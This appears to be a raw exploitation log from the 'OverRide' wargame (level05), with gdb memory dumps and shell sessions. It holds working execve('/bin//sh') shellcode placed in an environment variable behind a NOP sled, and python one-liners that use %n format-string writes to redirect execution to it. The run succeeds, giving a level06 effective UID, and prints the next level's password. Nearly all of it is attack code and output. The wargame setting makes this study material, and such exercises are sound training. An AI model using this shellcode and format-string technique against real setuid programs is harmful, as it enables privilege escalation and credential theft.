0xffffdf2d:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x/s 0xffffdf2d
0xffffdf2d:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf30  
0xffffdf30:	 "LOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf50
0xffffdf50:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf60
0xffffdf60:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"


0xffffdf60 -> 4294958944
4294958944 - 4 = 4294958940

	python -c 'print "\xe0\x97\x04\x08" + "%4294958940x" + "%10$n"'




0x80497e0 <- 0xdf60 - 8 = 57184 - 8 = 57176

0x80497e2 <- 0xffff - 57176 = 65535 - 57176 = 8359

	python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176d" + "%10$n" + "%8359d" + "%11$n"'





level05@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" ')
level05@OverRide:~$ env
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.0.2.2 45736 4242
OLDPWD=/home/users/level04
SSH_TTY=/dev/pts/0
USER=level05
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/level05
PWD=/home/users/level05
LANG=en_US.UTF-8
HOME=/home/users/level05
SHLVL=2
LANGUAGE=en_US:en
LOGNAME=level05
SSH_CONNECTION=10.0.2.2 45736 10.0.2.15 4242
LESSOPEN=| /usr/bin/lesspipe %s
PAYLOAD=����������������������������������������������������������������������������������������������������1���
          Qh//shh/bin��̀
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env
level05@OverRide:~$ clear

level05@OverRide:~$ gdb ./level05 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level05/level05 
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) x/200s environ
0xffffd73c:	 "s\330\377\377\207\330\377\377\227\330\377\377\266\330\377\377\311\330\377\377\326\330\377\377\367\335\377\377\003\336\377\377\032\336\377\377g\336\377\377v\336\377\377\216\336\377\377\237\336\377\377\250\336\377\377\260\336\377\377\311\336\377\377\333\336\377\377\353\336\377\377\030\337\377\377\070\337\377\377\272\337\377\377"
0xffffd791:	 ""
0xffffd792:	 ""
0xffffd793:	 ""
0xffffd794:	 " "
0xffffd796:	 ""
0xffffd797:	 ""
0xffffd798:	 "0\264\375\367!"
0xffffd79e:	 ""
0xffffd79f:	 ""
0xffffd7a0:	 ""
0xffffd7a1:	 "\260\375\367\020"
0xffffd7a6:	 ""
0xffffd7a7:	 ""
0xffffd7a8:	 "\377\373\213\027\006"
0xffffd7ae:	 ""
0xffffd7af:	 ""
0xffffd7b0:	 ""
0xffffd7b1:	 "\020"
0xffffd7b3:	 ""
0xffffd7b4:	 "\021"
0xffffd7b6:	 ""
0xffffd7b7:	 ""
0xffffd7b8:	 "d"
0xffffd7ba:	 ""
0xffffd7bb:	 ""
0xffffd7bc:	 "\003"
0xffffd7be:	 ""
0xffffd7bf:	 ""
0xffffd7c0:	 "4\200\004\b\004"
0xffffd7c6:	 ""
0xffffd7c7:	 ""
0xffffd7c8:	 " "
0xffffd7ca:	 ""
0xffffd7cb:	 ""
0xffffd7cc:	 "\005"
0xffffd7ce:	 ""
0xffffd7cf:	 ""
0xffffd7d0:	 "\b"
0xffffd7d2:	 ""
0xffffd7d3:	 ""
0xffffd7d4:	 "\a"
0xffffd7d6:	 ""
0xffffd7d7:	 ""
0xffffd7d8:	 ""
0xffffd7d9:	 "\300\375\367\b"
0xffffd7de:	 ""
0xffffd7df:	 ""
0xffffd7e0:	 ""
0xffffd7e1:	 ""
0xffffd7e2:	 ""
0xffffd7e3:	 ""
0xffffd7e4:	 "\t"
0xffffd7e6:	 ""
0xffffd7e7:	 ""
0xffffd7e8:	 "\220\203\004\b\v"
0xffffd7ee:	 ""
0xffffd7ef:	 ""
0xffffd7f0:	 "\355\003"
0xffffd7f3:	 ""
0xffffd7f4:	 "\f"
0xffffd7f6:	 ""
0xffffd7f7:	 ""
0xffffd7f8:	 "\355\003"
0xffffd7fb:	 ""
0xffffd7fc:	 "\r"
0xffffd7fe:	 ""
0xffffd7ff:	 ""
0xffffd800:	 "\355\003"
0xffffd803:	 ""
0xffffd804:	 "\016"
0xffffd806:	 ""
0xffffd807:	 ""
0xffffd808:	 "\355\003"
0xffffd80b:	 ""
0xffffd80c:	 "\027"
0xffffd80e:	 ""
0xffffd80f:	 ""
0xffffd810:	 ""
0xffffd811:	 ""
0xffffd812:	 ""
0xffffd813:	 ""
0xffffd814:	 "\031"
0xffffd816:	 ""
0xffffd817:	 ""
0xffffd818:	 ";\330\377\377\037"
0xffffd81e:	 ""
0xffffd81f:	 ""
0xffffd820:	 "\334\337\377\377\017"
0xffffd826:	 ""
0xffffd827:	 ""
0xffffd828:	 "K\330\377\377"
0xffffd82d:	 ""
0xffffd82e:	 ""
0xffffd82f:	 ""
0xffffd830:	 ""
0xffffd831:	 ""
0xffffd832:	 ""
0xffffd833:	 ""
0xffffd834:	 ""
0xffffd835:	 ""
0xffffd836:	 ""
0xffffd837:	 ""
0xffffd838:	 ""
0xffffd839:	 ""
0xffffd83a:	 ""
0xffffd83b:	 "\300\374\037T\304\371r\023\230\315\023(\f\240\314\034i686"
0xffffd850:	 ""
0xffffd851:	 ""
0xffffd852:	 ""
0xffffd853:	 ""
0xffffd854:	 ""
0xffffd855:	 ""
0xffffd856:	 ""
0xffffd857:	 "/home/users/level05/level05"
0xffffd873:	 "TERM=xterm-256color"
0xffffd887:	 "SHELL=/bin/bash"
0xffffd897:	 "SSH_CLIENT=10.0.2.2 45736 4242"
0xffffd8b6:	 "SSH_TTY=/dev/pts/0"
0xffffd8c9:	 "USER=level05"
0xffffd8d6:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xffffd99e:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xffffda66:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xffffdb2e:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xffffdbf6:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xffffdcbe:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xffffdd86:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xffffddf7:	 "COLUMNS=102"
0xffffde03:	 "MAIL=/var/mail/level05"
0xffffde1a:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xffffde67:	 "_=/usr/bin/gdb"
0xffffde76:	 "PWD=/home/users/level05"
0xffffde8e:	 "LANG=en_US.UTF-8"
0xffffde9f:	 "LINES=53"
0xffffdea8:	 "SHLVL=2"
0xffffdeb0:	 "HOME=/home/users/level05"
0xffffdec9:	 "LANGUAGE=en_US:en"
0xffffdedb:	 "LOGNAME=level05"
0xffffdeeb:	 "SSH_CONNECTION=10.0.2.2 45736 10.0.2.15 4242"
0xffffdf18:	 "LESSOPEN=| /usr/bin/lesspipe %s"
0xffffdf38:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343̀"
0xffffdfba:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
0xffffdffd:	 ""
0xffffdffe:	 ""
0xffffdfff:	 ""
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>

0xffffdf38 -> 4294958904
4294958904 - 4 = 4294958900


python -c 'print "\xe0\x97\x04\x08" + "%4294958900x" + "%10$n"'

0xffffdf38



0x80497e0 <- 0xdf38 => 57144 - 8 = 57136

0x80497e2 <- 0xffff => 65535 - 57144 = 8391

	python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57136d" + "%10$n" + "%8391d" + "%11$n"'


0xffffdf60

0x80497e0 <- 0xdf60 => 57184 - 8 = 57176

0x80497e2 <- 0xffff => 65535 - 57184 = 8351

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176d" + "%10$n" + "%8351d" + "%11$n"'

level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176d" + "%10$n" + "%8351d" + "%11$n"'; cat) | ./level05 
�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     100                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     -134415680
id 
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
exit
^C


level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176x" + "%10$n" + "%8351x" + "%11$n"'; cat) | ./level05 
�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    